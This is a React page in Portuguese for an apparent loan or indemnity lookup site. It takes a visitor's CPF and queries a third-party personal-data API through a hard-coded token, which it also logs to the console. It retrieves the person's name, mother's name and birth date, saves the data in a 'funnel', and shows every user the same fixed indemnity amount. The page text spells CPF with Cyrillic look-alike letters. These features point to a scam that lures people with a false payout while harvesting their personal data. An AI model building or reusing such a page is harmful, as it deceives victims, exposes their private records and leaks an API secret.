import React, { useState } from 'react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import HeroSection from '../components/HeroSection';
import InfoSection from '../components/InfoSection';
import CPFForm from '../components/CPFForm';
import ResultDisplay from '../components/ResultDisplay';
import FAQSection from '../components/FAQSection';
import { useNavigate } from 'react-router-dom';
import { useScrollAnimation } from '../hooks/useScrollAnimation';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';

const HomePage: React.FC = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();
  const formAnimation = useScrollAnimation();
  const buttonAnimation = useScrollAnimation();

  const handleCPFSubmit = async (cpf: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      // Remove qualquer caractere não numérico do CPF
      const cpfLimpo = cpf.replace(/\D/g, "");
      
      if (cpfLimpo.length !== 11) {
        setError('CPF deve conter 11 dígitos.');
        setIsLoading(false);
        return;
      }

      console.log('Consultando CPF:', cpfLimpo);
      
      const MAGMA_API_TOKEN = "d7c5436286e44288a459ca98de0e140bd32fe9717dcadb1c6bd13526f24a78b9";
      const apiUrl = `https://magmadatahub.com/api.php?token=${MAGMA_API_TOKEN}&cpf=${cpfLimpo}`;
      console.log('URL da API:', apiUrl);

      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
        },
      });

      console.log('Status da resposta:', response.status);

      const responseText = await response.text();
      console.log('Resposta bruta:', responseText);

      let data;
      try {
        data = JSON.parse(responseText);
        console.log('Dados parseados:', data);
      } catch (parseError) {
        console.error('Erro ao fazer parse do JSON:', parseError);
        setError('Erro ao processar resposta da API. Resposta: ' + responseText.substring(0, 100));
        setIsLoading(false);
        return;
      }

      if (!response.ok) {
        const errorMessage = data.error || 'Erro ao consultar CPF';
        if (response.status === 400) {
          setError('Parâmetros obrigatórios ausentes.');
        } else if (response.status === 403) {
          setError('Token inválido, plano expirado ou limite atingido.');
        } else if (response.status === 502) {
          setError('Erro na base externa. Tente novamente em instantes.');
        } else {
          setError(errorMessage);
        }
        setIsLoading(false);
        return;
      }

      if (!data || !data.nome) {
        console.error('Dados inválidos ou CPF não encontrado:', data);
        setError('CPF não encontrado. Por favor, verifique o número e tente novamente.');
        setIsLoading(false);
        return;
      }

      const userData = {
        nome: data.nome,
        mae: data.nome_mae || 'Não informado',
        cpf: data.cpf || cpfLimpo,
        sexo: data.sexo || '',
        dataNascimento: data.nascimento || '',
        email: `${cpfLimpo}@cliente.com`,
        telefone: '11999999999',
        endereco: {
          cep: '01000000',
          logradouro: 'Rua Principal',
          numero: '100',
          complemento: '',
          bairro: 'Centro',
          cidade: 'São Paulo',
          estado: 'SP'
        }
      };

      // Save complete user data in sessionStorage and localStorage
      sessionStorage.setItem('userData', JSON.stringify(userData));
      saveFunnelData({
        cpf: cpfLimpo,
        userData: userData,
        currentStep: '/resultado'
      });

      navigate('/resultado', {
        state: {
          userData: userData,
          indemnityAmount: 7854.63
        }
      });
    } catch (error: any) {
      console.error('Error fetching data:', error);
      console.error('Error details:', {
        name: error?.name,
        message: error?.message,
        stack: error?.stack,
      });

      // Mensagens de erro mais específicas
      if (error?.name === 'TypeError' && error?.message?.includes('Failed to fetch')) {
        setError('Não foi possível conectar ao servidor. Verifique sua conexão com a internet ou tente novamente mais tarde.');
      } else if (error?.message) {
        setError(`Erro: ${error.message}`);
      } else {
        setError('Ocorreu um erro ao consultar o CPF. Por favor, tente novamente.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-light-gray">
      <Header />
      
      <main>
        <HeroSection />
        
        <div id="consulta" className="relative py-20 px-6 md:px-12 min-h-screen flex items-center rounded-t-[20px] overflow-hidden z-10">
          <div
            className="absolute inset-0 -z-10"
            style={{
              backgroundImage: `linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('/dawdawd.webp')`,
              backgroundSize: 'cover',
              backgroundPosition: 'center',
            }}
          />
          
          <div className="relative max-w-7xl mx-auto w-full">
            <div className="text-center mb-12">
              <h2 className="text-3xl md:text-4xl font-semibold text-white mb-4">
                Consulte seu Empréstimo
              </h2>
              <p className="text-white max-w-2xl mx-auto [text-shadow:_1px_1px_2px_rgba(0,0,0,0.5)]">
                Informe seu СРF abaixo para verificar se você possui empréstimos disponíveis.
              </p>
            </div>

            <div
              ref={formAnimation.ref}
              className={`animate-on-scroll ${formAnimation.isVisible ? 'visible' : ''}`}
            >
              <CPFForm onSubmit={handleCPFSubmit} isLoading={isLoading} />
            </div>
            
            {error && (
              <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-4 text-center animate-fade-in">
                <p className="text-red-700">{error}</p>
              </div>
            )}
          </div>
        </div>

        <InfoSection />

        <FAQSection />

        <div
          ref={buttonAnimation.ref}
          className={`py-8 px-4 text-center animate-on-scroll ${buttonAnimation.isVisible ? 'visible' : ''}`}
        >
          <button
            onClick={() => {
              const consultaSection = document.getElementById('consulta');
              consultaSection?.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }}
            className="bg-purple-600 hover:bg-purple-700 text-white font-semibold py-4 px-8 rounded-lg text-lg transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl"
          >
            Consultar Agora
          </button>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default HomePage